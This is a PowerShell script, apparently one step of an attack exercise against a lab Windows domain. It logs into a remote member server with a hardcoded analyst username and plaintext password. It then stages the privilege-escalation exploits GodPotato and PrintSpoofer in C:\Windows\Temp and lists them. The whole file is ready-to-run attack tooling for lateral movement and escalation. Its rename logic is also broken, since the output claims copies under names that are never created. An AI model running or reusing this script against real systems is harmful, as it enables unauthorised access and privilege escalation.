[CmdletBinding()]
param(
    [string]$TargetHost = "mbr01.child.cadre.local",
    [string]$Username = "child.cadre.local\analyst_t1",
    [string]$Password = "T13r_An@lyst!",
    [string]$SourceDir = "C:\Tools\ADTools"
)
$ErrorActionPreference = "Stop"

$destLocal = "C:\Windows\Temp\cadre-tools"

# Files present on ws01: GodPotato-NET4.exe is the only GodPotato variant.
# Exec scripts reference GodPotato.exe -> copy as both names.
$copies = @(
    @{ Src = "GodPotato-NET4.exe"; Dst = "GodPotato.exe" },
    @{ Src = "GodPotato-NET4.exe"; Dst = "GodPotato-NET4.exe" },
    @{ Src = "PrintSpoofer64.exe"; Dst = "PrintSpoofer64.exe" }
)

$cred = New-Object System.Management.Automation.PSCredential($Username, (ConvertTo-SecureString $Password -AsPlainText -Force))

try {
    $session = New-PSSession -ComputerName $TargetHost -Credential $cred

    Invoke-Command -Session $session -ScriptBlock {
        param($d)
        New-Item -ItemType Directory -Path $d -Force -ErrorAction SilentlyContinue | Out-Null
    } -ArgumentList $destLocal

    foreach ($c in $copies) {
        $srcPath = Join-Path $SourceDir $c.Src
        if (-not (Test-Path $srcPath)) {
            Write-Output "SKIP|$($c.Src) not present on ws01"
            continue
        }
        Copy-Item -Path $srcPath -Destination $destLocal -ToSession $session -Force
        Write-Output "COPIED|$($c.Src) -> $($c.Dst)"
    }

    Invoke-Command -Session $session -ScriptBlock {
        param($d)
        Get-ChildItem $d | Select-Object Name, Length | ForEach-Object { Write-Output "$($_.Name)|$($_.Length)" }
    } -ArgumentList $destLocal | ForEach-Object { Write-Output "REMOTE|$_" }

    Remove-PSSession $session
    Write-Output "T043_STAGE_OK"
} catch {
    Write-Output "STAGE_FAIL: $($_.Exception.Message)"
    exit 1
}
